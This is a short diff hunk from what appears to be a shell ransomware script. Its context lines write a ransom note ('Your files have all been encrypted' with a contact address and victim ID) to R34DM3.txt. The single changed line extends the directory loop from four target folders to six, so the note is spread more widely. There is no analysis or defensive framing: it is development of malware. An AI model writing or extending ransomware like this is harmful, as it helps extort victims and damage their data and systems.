@@ -73,7 +73,7 @@ done
 
 echo "Your files have all been encrypted, contact example@protonmail.com for the decryption key! Your unique victim ID: $victim_id" > R34DM3.txt
 
-for dir in $(find $target_dir_1 $target_dir_2 $target_dir_3 $target_dir_4 -type d); do
+for dir in $(find $target_dir_1 $target_dir_2 $target_dir_3 $target_dir_4 $target_dir_5 $target_dir_6 -type d); do
     cp R34DM3.txt "$dir/R34DM3.txt"
 done
 
